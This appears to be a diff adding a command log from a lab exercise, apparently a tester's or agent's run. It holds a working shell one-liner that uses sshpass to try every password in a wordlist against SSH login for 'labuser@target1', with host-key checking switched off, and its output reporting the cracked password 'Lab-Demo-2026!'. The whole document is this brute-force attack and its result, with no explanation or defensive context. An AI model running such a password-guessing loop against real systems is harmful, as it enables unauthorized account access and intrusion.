@@ -1,0 +1,8 @@
+$ while IFS= read -r pw; do sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no labuser@target1 'echo MATCH' 2>/dev/null && echo "FOUND: $pw" && exit 0; done < /tmp/wordlist.txt; echo FOUND_NONE; exit 1
+exit_code: 0
+--- stdout ---
+MATCH
+FOUND: Lab-Demo-2026!
+
+--- stderr ---
+
